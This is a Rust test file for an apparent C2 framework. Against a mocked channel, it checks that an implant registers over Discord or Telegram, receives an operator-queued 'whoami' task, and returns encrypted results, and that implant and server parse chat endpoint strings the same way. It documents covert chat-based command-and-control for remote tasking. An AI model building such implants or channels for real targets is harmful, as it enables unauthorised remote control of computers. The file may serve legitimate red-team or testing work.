//! Discord/Telegram as real callback channels, not just chat.
//!
//! The implant posts a sealed frame into a chat channel and polls for the
//! operator's reply. That is only half a loop: without a server reading the
//! same channel the beacon posts into a void and is never tasked. These tests
//! run both halves against a mock channel and assert the full round trip —
//! register, task dispatch, and result delivery — happens over the chat
//! transport.

use std::sync::{Arc, Mutex};

use nw_profile::chat::Cursor;
use nw_profile::crypto;
use nw_profile::envelope::{Envelope, Kind};
use nw_profile::msgs::{PollReply, PollRequest, Register, RegisterAck};

fn session_key(psk: &[u8]) -> [u8; crypto::KEY_LEN] {
    crypto::derive_key(psk, b"nw-m1-salt")
}

fn b64(raw: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(raw)
}

/// Stands in for the live Discord/Telegram API. Messages live in one shared
/// vector, so a beacon "posting" is observable by the server and vice versa —
/// the same shared channel both real platforms provide.
#[derive(Default)]
struct SharedChannel {
    messages: Mutex<Vec<(String, String)>>,
    next_id: Mutex<u64>,
}

impl SharedChannel {
    fn post(&self, body: &str) -> String {
        let mut id = self.next_id.lock().unwrap();
        *id += 1;
        let msg_id = id.to_string();
        drop(id);
        self.messages
            .lock()
            .unwrap()
            .push((msg_id.clone(), body.to_owned()));
        msg_id
    }
    fn snapshot(&self) -> Vec<(String, String)> {
        self.messages.lock().unwrap().clone()
    }
}

struct MockChannel {
    shared: Arc<SharedChannel>,
}

#[async_trait::async_trait]
impl nw_profile::chat_channel::ChatChannel for MockChannel {
    async fn post(&self, body: &str) -> Result<String, String> {
        Ok(self.shared.post(body))
    }
    async fn poll(&self) -> Result<Vec<nw_profile::chat_channel::ChatMessage>, String> {
        Ok(self
            .shared
            .snapshot()
            .into_iter()
            .map(|(id, body)| nw_profile::chat_channel::ChatMessage { id, body })
            .collect())
    }
}

#[allow(dead_code)]
async fn repository() -> naughtywolf::db::repositories::Repository {
    let pool = naughtywolf::db::create_pool("sqlite::memory:")
        .await
        .unwrap();
    naughtywolf::db::run_migrations(&pool).await.unwrap();
    naughtywolf::db::repositories::Repository { pool }
}

/// The whole point: a beacon registers through the chat channel, is handed a
/// real task, and returns the result over the same channel.
#[tokio::test]
async fn a_beacon_registers_tasks_and_returns_results_over_a_chat_channel() {
    let pool = naughtywolf::db::create_pool("sqlite::memory:")
        .await
        .unwrap();
    naughtywolf::db::run_migrations(&pool).await.unwrap();
    let repository = naughtywolf::db::repositories::Repository { pool: pool.clone() };
    let psk: Vec<u8> = b"chat-callback-psk".to_vec();
    let psk_key = session_key(&psk);

    let shared = Arc::new(SharedChannel::default());
    let server_channel = MockChannel {
        shared: shared.clone(),
    };
    let beacon_channel = MockChannel {
        shared: shared.clone(),
    };

    let handler = naughtywolf::c2_chat::frame_handler(repository.clone(), Arc::new(psk.clone()));
    let cursor = Cursor::new();
    let beacon_cursor = Cursor::new();

    // --- Beacon side: register over the chat channel. ---
    let implant_kp = crypto::KeyPair::generate();
    let register = Register {
        hostname: "chat-lab".into(),
        username: "operator".into(),
        os: "linux".into(),
        arch: "x86_64".into(),
        pid: 4242,
        addr: "127.0.0.1".into(),
        os_version: None,
        executable_path: None,
        local_addr: None,
        implant_version: None,
        interval_ms: None,
        jitter_ms: None,
        capabilities: None,
        session_key: b64(&implant_kp.public_key()),
    };
    let ct = crypto::encrypt(&psk_key, 1, &serde_json::to_vec(&register).unwrap()).unwrap();
    let wire = Envelope::new(Kind::Register, 1, None, ct)
        .seal(&psk_key)
        .unwrap()
        .into_bytes();

    beacon_post(
        &shared,
        &beacon_cursor,
        &nw_profile::chat::encode_frame(&wire),
    );
    assert_eq!(
        nw_profile::chat_channel::service_once(&server_channel, &cursor, handler.clone())
            .await
            .unwrap(),
        1,
        "server must service the register frame from the channel"
    );

    // The beacon polls the channel and picks up the register ack.
    let replies = beacon_cursor_poll(&beacon_channel, &beacon_cursor).await;
    let ack_wire = replies
        .into_iter()
        .next()
        .expect("beacon must receive a reply over the channel");
    let ack_env = Envelope::open(&psk_key, std::str::from_utf8(&ack_wire).unwrap()).unwrap();
    let ack: RegisterAck =
        serde_json::from_slice(&crypto::decrypt(&psk_key, ack_env.id, &ack_env.encrypted).unwrap())
            .unwrap();

    // The session is real: it landed in the database.
    let registered: String = sqlx::query_scalar("SELECT host FROM callbacks WHERE id = ?")
        .bind(ack.session_id.to_string())
        .fetch_one(&pool)
        .await
        .expect("chat-channel registration created a callback");
    assert_eq!(registered, "chat-lab");

    // --- Server side: queue a real task, answer the beacon's poll. ---
    let shared_secret = implant_kp
        .shared_secret(&base64_decode(&ack.server_pub))
        .unwrap();
    let key = crypto::derive_key(&shared_secret, crypto::SESSION_SALT);
    let queued = repository
        .enqueue_task(
            &ack.session_id.to_string(),
            "whoami",
            &serde_json::json!([]),
            5000,
        )
        .await
        .unwrap();

    let poll_ct = crypto::encrypt(
        &key,
        2,
        &serde_json::to_vec(&PollRequest::default()).unwrap(),
    )
    .unwrap();
    let poll_wire = Envelope::new(Kind::TaskResult, 2, Some(ack.session_id), poll_ct)
        .seal(&key)
        .unwrap()
        .into_bytes();
    beacon_post(
        &shared,
        &beacon_cursor,
        &nw_profile::chat::encode_frame(&poll_wire),
    );

    assert_eq!(
        nw_profile::chat_channel::service_once(&server_channel, &cursor, handler.clone())
            .await
            .unwrap(),
        1
    );

    // The beacon polls and must find its queued task.
    let replies = beacon_cursor_poll(&beacon_channel, &beacon_cursor).await;
    let poll_reply = replies
        .into_iter()
        .next()
        .expect("beacon must receive its task poll reply");
    let poll_env = Envelope::open(&key, std::str::from_utf8(&poll_reply).unwrap()).unwrap();
    let decoded: PollReply =
        serde_json::from_slice(&crypto::decrypt(&key, poll_env.id, &poll_env.encrypted).unwrap())
            .unwrap();
    assert_eq!(
        decoded.tasks.len(),
        1,
        "tasking reached the beacon over chat"
    );
    assert_eq!(decoded.tasks[0].id.to_string(), queued);

    // --- Beacon side: return the result over the same channel. ---
    let result = PollRequest {
        results: vec![nw_profile::msgs::TaskResult {
            task_id: decoded.tasks[0].id,
            ok: true,
            stdout: b"chat-task-ran".to_vec(),
            stderr: Vec::new(),
            exit_code: 0,
        }],
        ..Default::default()
    };
    let result_ct = crypto::encrypt(&key, 3, &serde_json::to_vec(&result).unwrap()).unwrap();
    let result_wire = Envelope::new(Kind::TaskResult, 3, Some(ack.session_id), result_ct)
        .seal(&key)
        .unwrap()
        .into_bytes();
    beacon_post(
        &shared,
        &beacon_cursor,
        &nw_profile::chat::encode_frame(&result_wire),
    );
    service_once_expect(&server_channel, &cursor, handler, 1).await;

    // The result is now queryable by the operator, exactly like an HTTP task.
    let stored: Vec<u8> =
        sqlx::query_scalar("SELECT stdout FROM c2_task_results WHERE task_id = ?")
            .bind(&queued)
            .fetch_one(&pool)
            .await
            .expect("task result stored from a chat-channel check-in");
    assert_eq!(
        String::from_utf8_lossy(&stored),
        "chat-task-ran",
        "the beacon's result over chat is the operator-visible output"
    );
}

/// Post as the beacon and record the id as its own, mirroring what the real
/// implant transport does after every post. Without this the beacon reads back
/// its own outbound frame instead of the operator's reply.
fn beacon_post(shared: &Arc<SharedChannel>, cursor: &Cursor, body: &str) {
    let id = shared.post(body);
    cursor.note_own(id);
}

async fn beacon_cursor_poll(channel: &MockChannel, cursor: &Cursor) -> Vec<Vec<u8>> {
    // Mirror the real implant transport: it walks the channel newest-first and
    // takes the first message that is not its own post.
    let messages = nw_profile::chat_channel::ChatChannel::poll(channel)
        .await
        .expect("poll");
    let mut newest_first = messages;
    newest_first.reverse();
    let mut accepted = Vec::new();
    for m in newest_first {
        if let Some(frame) = cursor.accept(&m.id, &m.body) {
            accepted.push(frame);
            break;
        }
    }
    accepted
}

async fn service_once_expect(
    channel: &MockChannel,
    cursor: &Cursor,
    handler: nw_profile::chat_channel::FrameHandler,
    expected: usize,
) {
    let handled = nw_profile::chat_channel::service_once(channel, cursor, handler)
        .await
        .unwrap();
    assert_eq!(handled, expected);
}

fn base64_decode(raw: &str) -> Vec<u8> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD
        .decode(raw)
        .unwrap()
}

/// Both platforms must expose the same endpoint shape the implant already
/// parses, so an operator can reuse one endpoint string for payload and server.
#[test]
fn chat_channel_endpoints_match_the_implant_forms() {
    assert!(
        nw_profile::chat_channel::channel_from_endpoint("discord://c2-token@123456789").is_ok()
    );
    assert!(nw_profile::chat_channel::channel_from_endpoint("telegram://c2-token@98765").is_ok());
}

/// The portal-built endpoint must be one the implant's own transport parser
/// accepts, and the channel must come out of that parsed config. This is the
/// seam that was broken: the wizard produced `discord://host:port`, which the
/// implant rejects, so the option could never have worked.
#[test]
fn a_portal_built_chat_endpoint_drives_the_real_implant_transport() {
    let (config, _, _) = naughtywolf::payload::payload_config_for_test(
        "discord",
        Some("MTIzNDU2.token.x"),
        Some("1234567890"),
        b"psk",
    );
    assert_eq!(config.endpoint, "discord://MTIzNDU2.token.x@1234567890");

    // The implant builds its transport straight from that endpoint string.
    let transport = nw_implant::transport::Transport::from_endpoint(&config.endpoint)
        .expect("implant must accept the portal-built chat endpoint");
    assert_eq!(
        transport.describe(),
        "discord:1234567890",
        "the beacon must address the channel the operator configured"
    );
}

/// The same must hold for Telegram, whose token itself contains a colon, so a
/// naive `split(':')` would break it.
#[test]
fn a_telegram_chat_endpoint_drives_the_real_implant_transport() {
    let (config, _, _) = naughtywolf::payload::payload_config_for_test(
        "telegram",
        Some("123456:ABC-DEF"),
        Some("-1001234567"),
        b"psk",
    );
    assert_eq!(config.endpoint, "telegram://123456:ABC-DEF@-1001234567");

    let transport = nw_implant::transport::Transport::from_endpoint(&config.endpoint)
        .expect("implant must accept the portal-built telegram endpoint");
    assert_eq!(transport.describe(), "telegram:-1001234567");
}

/// Both ends must derive the same channel from one endpoint string, otherwise
/// the beacon posts to one place and the C2 reads another.
#[test]
fn the_server_and_the_beacon_agree_on_the_channel_from_one_endpoint() {
    let endpoint = "discord://MTIzNDU2.token.x@1234567890";
    assert!(
        nw_profile::chat_channel::channel_from_endpoint(endpoint).is_ok(),
        "the server must accept the endpoint the wizard produces"
    );
    assert!(
        nw_implant::transport::Transport::from_endpoint(endpoint).is_ok(),
        "the beacon must accept the same endpoint"
    );
}
